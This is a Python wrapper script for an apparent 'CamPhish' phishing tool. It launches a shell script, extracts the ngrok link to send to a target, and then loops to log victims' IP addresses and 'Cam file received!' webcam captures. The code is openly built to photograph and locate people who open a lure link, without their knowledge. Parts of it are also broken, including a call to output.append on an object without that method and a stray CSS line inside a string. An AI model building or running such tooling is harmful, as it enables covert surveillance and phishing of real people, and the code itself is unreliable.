import configparser
import shlex
import subprocess
import pexpect
import platform
import sys
import re
from pexpect import spawn

global cstm_data


class Output:
    def __init__(self, link: str = None, connections=None):
        if connections is None:
            connections = list( )
        self.link = link
        self.connections = connections
        self.old_connections = list()


output = Output( )


def camphish(service: int, template: int, autthoken: str) -> str:
    global output
    """
    :param service: int
    :param template: int
    :param autthoken: str
    :return: ngrok_link
    """

    class TextIOTrap:
        name = None
        buffer = None
        encoding = None
        errors = None
        newlines = None
        line_buffering = None

        def __init__(self, **args):
            self.write_handler = args.get('write_handler', None)
            self.name = args.get('name', '-')

        def __iter__(self):
            return []

        def close(self):
            pass

        def detach(self):
            pass

        def fileno(self):
            return 0

        def flush(self):
            pass

        def isatty(self):
            return False

        def read(self, n=None):
            return ''

        def readable(self):
            return False

        def readline(self, limit=-1):
            pass

        def readlines(self, hint=-1):
            return []

        def seek(self, offset, whence=0):
            pass

        def seekable(self):
            return False

        def tell(self):
            return 0

        def truncate(self, size=None):
            pass

        def writable(self):
            return True

        def write(self, s):
            if self.write_handler and not s == '\n':
                self.write_handler(s)
            return 0

        def writelines(self, lines):
            if isinstance(lines, list):
                for s in lines: self.write(s)

    '''
        class custom_thread(threading.Thread):
        def __init__(self, function, args, daemon=False):
            super( ).__init__(target=function, args=args, daemon=daemon)
            self._is_running = True

        def run(self):
            while self._is_running:
                super( ).run( )

        def stop(self):
            self._is_running = False
    
    '''

    config = configparser.ConfigParser( )
    config.read('app.cfg')
    if platform.system( ) == 'Linux':
        print('Linux detected')
        camphish_proc: spawn = pexpect.spawn(f'bash  startcam.sh {service} {template}')
        sysbackup = sys.stdout
        camphish_proc.timeout = int(config['RUNTIME']['TIMEOUT'])

        compiled_ngrok_url = re.compile(r"https://[\w-]*\.ngrok\.io")
        camphish_proc.expect(compiled_ngrok_url.pattern)

        data = camphish_proc.before
        data = data.decode('utf-8')

        link = re.findall(compiled_ngrok_url.pattern, data)
        if not link:
            test = subprocess.run(['./get_ip.sh'], capture_output=True, text=True)
            link = test.stdout
            # print('LINK: ', end='')
            # print(link)
            output.link = link
            # subprocess.run(['killall', 'ngrok', '/dev/null'])
            # http_tunnel = ngrok.connect(addr=3333, bind_tls=True)
            # print(http_tunnel.public_url)

        # compiled_ip = re.compile("^\\[\\+] Target opened the link!\\\\r\\\\n\\[\\+] IP: \\b(?:(?:2(?:[0-4][0-9]|5[
        # 0-5])|[0-1]?[0-9]?[0-9])\\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\\b\\\\r\\\\n$")
        pattern = re.compile('\\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\\b')

        def get_ip():
            while True:
                camphish_proc.expect(pattern.pattern)
                ip = camphish_proc.after.decode('utf-8')
                output.append(ip)

        def get_cam():
            while True:
                camphish_proc.expect('[+] Cam file received!')
                output.append('[+] Cam file received!')

        # ip_thread = threading.Thread(target=get_ip, daemon=True)

        # camthread = threading.Thread(target=get_cam, daemon=True)

        # ip_thread.start()
        # camthread.start()

        while True:
            camphish_proc.expect([pattern.pattern, 'Cam file received!'])
            ip = camphish_proc.after.decode('utf-8')
            output.connections.append(ip)


    elif platform.system( ) == 'Windows':
        print('WINDOWS DETECTED')
        return 'Windows support not implemented yet.'
    # todo maybe implement Windows support to run supproccesses with interactive answers
    elif platform.system( ) == 'Darwin':
        print('MacOS(DARWIN) DETECTED')
        return 'MacOS support not implemented yet.'
        # todo maybe implement MacOS support to run supproccesses with interactive answers


'''
        def ip_listener(op: list):
            sys.stdout = TextIOTrap(write_handler=lambda s: op.append(s))
            camphish_proc.interact( )
            sys.stdout = sysbackup
            print('Thread zuende', file=sysbackup)
            return op

        try:
            camphish_proc.expect(pexpect.EOF)  # todo maybe add a cleaner way of expect. My guess waiting for the pattern of the ngrok address 
            print('ERROR')
            exit(1)
        except:
            data = camphish_proc.before
            data = data.decode('utf-8')
            pattern = re.compile("https://[\w-]*\.ngrok\.io")
            link = re.findall(pattern, data)
            print(link[0])

            output = []

            ip_thread = custom_thread(function=ip_listener, args=(output,))
            print('IP THREAD STARTET')
            ip_thread.start( )
            print('Thread gestartet', file=sysbackup)
            time.sleep(5)
            data = camphish_proc.buffer
            data = data.decode('utf-8')
            print('PRINTING DATA', file=sysbackup)
            print(data, file=sysbackup)
            print('DATA PRINTED', file=sysbackup) 
    
background-image: radial-gradient(circle farthest-corner at center, #3C4B57 0%, #1C262B 100%);

'''
